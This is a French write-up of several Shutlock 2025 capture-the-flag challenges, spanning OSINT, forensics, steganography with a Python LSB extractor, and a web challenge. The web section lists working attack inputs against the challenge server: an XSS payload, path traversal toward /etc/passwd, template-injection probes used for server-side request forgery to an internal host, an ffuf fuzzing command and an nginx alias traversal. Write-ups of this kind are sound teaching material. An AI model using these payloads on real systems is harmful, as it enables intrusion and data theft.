Histoire 
===============

OSINT : Un pingouin dans une botte de foin
----------------------------------------------

On cherche des infos sur Line Huks,

Avec IDCRAWL on trouve rapidement son twitter : https://x.com/LineHuks/with_replies 

Puis avec "LineHuks" on trouve également :

- Blueskye : https://bsky.app/profile/linehuks.bsky.social
- Reddit : https://www.reddit.com/user/LineHuks/

Sur Reddit elle explique qu'on peut voir qui nous a partage une vidéo sur tiktok si on est sur mobile ou avec un user agent mobile

On passe donc chrome en mode mobile et on visite son lien tiktok posté sur blueskye : vm.tiktok.com/ZNdjwpCF4/

.. figure:: ../_static/img/shutlock-2025/shutlock_1.png
    :alt: Compte Tiktok
    :align: center
    :width: 1200

On retrouve alors son compte Tiktok et ses publications.

Dans l'une d'elle on peut retrouver le flag : https://www.tiktok.com/@lestudiodutux/video/7500242847291968790 

.. figure:: ../_static/img/shutlock-2025/shutlock_2.png
    :alt: Compte Tiktok
    :align: center
    :width: 1200

On a donc notre flag : **SHLK{LABO_FOR4_CO5P}**


Forensic - Le Générique de Trop
-----------------------------------

On a plusieurs fichiers XML, dont un avec les sous titres du finalement

Dedans on retrouve ceci : 

.. code-block:: XML

    <Subtitle>
    <Start>00:00:48,500</Start>
    <End>00:00:48,500</End>
    <Text>Dans Ce Pays, Hélas, malgré le fort potentiel qu'il A, C'est une période sombre : il subit un Krack Économique Dramatique.</Text>
    </Subtitle> 

Il y a des majuscules un peu partout, si on ne garde que les majuscules on obtient DCPHACKED

On test au cas ou, c'est bien notre flag : **SHLK{DCPHACKED}**


Web - Real Be 
-----------------

On commence l'étape 2 avec le web 

Le formulaire nous emmène sur cette url : http://57.128.112.118:11658/get_url.php?video=a&director=b&email=a%40a.fr

On trouve rapidement une injection html et une xss dans le paramètre "video" : 

.. code-block:: console

    http://57.128.112.118:11658/get_url.php?video=<h1>test&director=b&email=a%40a.fr
    http://57.128.112.118:11658/get_url.php?video=<img src=x onerror='alert(1)'>&director=b&email=a%40a.fr

Mais a priori rien à en faire directement.

On se pose la question de la SSTI mais la page n'a aucun template. 

On cherche plutôt un fichier en faites 

Si on se rend sur http://57.128.112.118:11658/get_url.php

On obtient "Pas d'url ou de route donnée" 

En ajoutant email ou director en paramètre, la page ne change pas, donc seul le paramètre video est utile.

.. code-block:: console

    http://57.128.112.118:12116/get_url.php?video[1]=1
    ==> Erreur avec emplacement du fichier /var/www/html/get_url.php

    http://57.128.112.118:11658/get_url.php?video=....//....//
    ==> Film « .... » introuvable. 
    ==> filtre sur ../ ? 

    http://57.128.112.118:11658/get_url.php?video=..\..\..\..\..\etc\passwd 
    ==> Film « ..\..\..\..\..\etc\passwd » introuvable.

    http://57.128.112.118:11658/get_url.php?video=...//a
    ==> Film « a » introuvable.

On sait également que c'est du PHP, donc peut être un wrapper php ? Non

On a demandé de l'aide, en faites il faut déjà commencé par obtenir un film valide, et notamment "L is Dead" : http://57.128.112.118:11531/get_url.php?video=L+is+Dead 

Ensuite on a un formulaire de commentaire, on test tout de suite {{7*7}} et on obtient 49.

Donc c'est une SSTI, et dans le code de la page on a : 

.. code-block:: console

     <!-- service interne : invisible_server -->

On va donc essayer de contacter ce serveur avec la SSTI :

.. code-block:: console

    {{include("index.html")}}
    {{include("https://invisible_server")}} ==> allow_url_include==O donc https désactivé, pareil avec http
    {{file_get_contents('http://invisible_server/')}} ==> 403 
    {{file_get_contents('https://invisible_server/')}} ==> Connection refused
    {{fopen("http://invisible_server/", "r");}} ==> 403 
    {{print_r(get_headers("http://invisible_server/", 1))}} ==> Array ( [0] => HTTP/1.1 403 Forbidden [Date] => Thu, 26 Jun 2025 15:46:19 GMT [Server] => Apache/2.4.62 (Debian) [Content-Length] => 281 [Connection] => close [Content-Type] => text/html; charset=iso-8859-1 )
    {{ curl_exec(curl_init("http://invisible_server/")) }} ==> 403 mais affiche la page
    {{fopen("http://invisible_server/%20/", "r");}} ==> Resource id #3
    {{print_r(get_headers("http://invisible_server/%20/", 1))}} ==> Array ( [0] => HTTP/1.1 200 OK [Date] => Thu, 26 Jun 2025 16:16:06 GMT [Server] => Apache/2.4.62 (Debian) [X-Powered-By] => PHP/8.2.28 [Content-Length] => 60 [Connection] => close [Content-Type] => text/html; charset=UTF-8 )

    {{ curl_exec(curl_init("http://invisible_server/%20/")) }} ==> La route demandée n’est pas correcte ou est indisponible
    

    {{ curl_setopt($c = curl_init("http://invisible_server/%20/"), CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($c, CURLOPT_RETURNTRANSFER, true);curl_exec($c); }}


Finalement on part sur du fuzzing plutot que 403 bypass : 

.. code-block:: console

    ffuf -w doc/_static/files_to_download/wordlists/raft-medium-directories.txt -u "http://57.128.112.118:13003/get_url.php?video=L+is+Dead&comment=%7B%7B+curl_exec%28curl_init%28%22http%3A%2F%2Finvisible_server%2FFUZZ%22%29%29+%7D%7D" -fs 2096
    /interne/


On obtient ceci : 

"Bien joué ! Tu es arrivé sur le serveur secret !
Maintenant tu peux tenter de lister les ressources accessibles"

On va donc continuer le fuzzing jusqu'à trouve /interne/flag 

.. code-block:: console

    Tu viens de mettre la main sur des infos confidentielles, utiles pour la suite du challenge.
    Le but reste de vérifier que les noms donnés dans les crédits ne divulguent pas ceux des agents du ministère.
    Bon courage pour la deuxième partie du challenge.
    webapp
    ├── app
    │ ├── todo.txt
    │ └── webroot
    │ └── index.html
    └── static
    ├── capybara_detective.png
    ├── snoopy_in_a_lab.png
    ├── L-is-dead.mp4
    └── L-is-dead_DGSI.mp4.mp4
    Lien vers le dossier des vidéos : http://57.128.85.25:50014/

Bon je savais pas trop quoi faire avec les .mp4, jme suis fait bait par la description

Il faut accéder au fichier todo.txt, on est sur un serveur nginx, ça sent la misconfig ! 

On fait : http://57.128.85.25:50014/static../app/todo.txt 

Et on obtient notre flag : **SHLK{ssrf_f0und_th3_h1dd3n_p4th}**

Osint - Find The Lab 
------------------------

Il faut retrouver le lieu de la photo prise :

.. figure:: ../_static/img/shutlock-2025/lab.png
    :alt: ALEAPP
    :align: center
    :width: 1200


Misc - Affiche Etrange
--------------------------

En inspectant un peu l'image, j'ai vraiment l'impression qu'il y a quelque chose qui tient de la stegano, du type lastBuildDate

On va commencer par ce site : 

On sait maintenant que le résultat de l'extration LSB est une image, mais pas possible de la récupérer via le site. 

Donc on va faire un script : 

.. code-block:: python 

    from PIL import Image
    import itertools

    PNG_SIGNATURE = b'\x89PNG\r\n\x1a\n'

    def extract_lsb_stream(image_path, channels):
        """Extrait les bits LSB d'une image selon les canaux spécifiés, retourne un flux binaire."""
        img = Image.open(image_path).convert("RGB")
        pixels = list(img.getdata())

        bitstream = []

        for pixel in pixels:
            for i, channel in enumerate("RGB"):
                if channel in channels:
                    bitstream.append((pixel[i] & 1))

        # Regrouper les bits en octets
        bytes_out = bytearray()
        for i in range(0, len(bitstream), 8):
            byte_bits = bitstream[i:i+8]
            if len(byte_bits) < 8:
                break
            byte = 0
            for bit in byte_bits:
                byte = (byte << 1) | bit
            bytes_out.append(byte)

        return bytes_out

    def try_extract_png(image_path, output_prefix="extracted"):
        """Teste toutes les combinaisons de canaux pour retrouver un fichier PNG"""
        combinations = []
        for i in range(1, 4):  # R, RG, RGB
            combinations.extend(itertools.combinations("RGB", i))

        for combo in combinations:
            combo_str = ''.join(combo)
            print(f"[*] Test combo: {combo_str}")
            data = extract_lsb_stream(image_path, combo_str)

            sig_index = data.find(PNG_SIGNATURE)
            if sig_index != -1:
                print(f"[+] PNG signature trouvée avec {combo_str} à l’offset {sig_index}")
                png_data = data[sig_index:]

                output_file = f"{output_prefix}_{combo_str}.png"
                with open(output_file, "wb") as f:
                    f.write(png_data)
                print(f"[✓] Fichier image extrait : {output_file}")
                return output_file

        print("[-] Aucun fichier PNG détecté.")
        return None

    if __name__ == "__main__":
        try_extract_png("the_da_vinci_code.png")


On obtient alors une image qui dit : RENDEZ VOUS 24H ICI spszzm8m8 Ne soyez pas en retard. 

On a donc un code qui détermine un lieu, peut être un mapcode ? A priori non 

Ni un Plus Code.

Qu'est ce qu'il reste ? GeoHash (Merci GPT j'avoue)!! https://www.movable-type.co.uk/scripts/geohash.html 

On saisit le code : spszzm8m8

Et on trouve le casino : **SHLK{casino_barriere_le_croisette}**


Forensic - Un cadavre peut en cacher un autre
------------------------------------------------

On nous donne un dossier compressé contenant les fichiers d'un téléphone portable

Avec ls -laR donc en récursif, on trouve rapidement un fichier nommé mes-données.kdbx 

Donc une archive Keepass, mais ou trouver le mot de passe ? 

On va utiliser ALEAPP https://github.com/abrignoni/ALEAPP 

Celui ci va nous pondre un petit rapport bien sympas ! 

Dans la partie Google Message on va trouver ceci : 

.. figure:: ../_static/img/shutlock-2025/aleapp.png
    :alt: ALEAPP
    :align: center
    :width: 1200

On obtient alors cette clé qui nous permet d'ouvrir le Keepass :

.. code-block:: console

    e,PY\;J{XKp!4.M4z1}7

Pour info on le trouve aussi ici dans l'image : 

.. figure:: ../_static/img/shutlock-2025/aleapp2.png
    :alt: ALEAPP
    :align: center
    :width: 1200

.. figure:: ../_static/img/shutlock-2025/aleapp3.jpg
    :alt: ALEAPP
    :align: center
    :width: 1200

Dedans on trouve un compte : 

.. code-block:: console

    perso:KwiLTYldD6g1WNW6pcFD 

Mais ce n'est pas le flag, alors que faire ? 

On peut voir qu'il y a des fichiers "attachments" dans le keepass sur l'entrée.

On va les récupérer : 

.. figure:: ../_static/img/shutlock-2025/boardpass.png
    :alt: BoardPass
    :align: center
    :width: 1200

On a son identité, mais a priori ce n'est pas le flag. 

Finalement on trouve notre flag : 

.. figure:: ../_static/img/shutlock-2025/idcard.png
    :alt: ID Card
    :align: center
    :width: 1200

Flag : **SHLK{OHL3S4LK4F4R}**


Et on ira pas plus loin parce que crypto et pwn hard, et bah tant pis haha !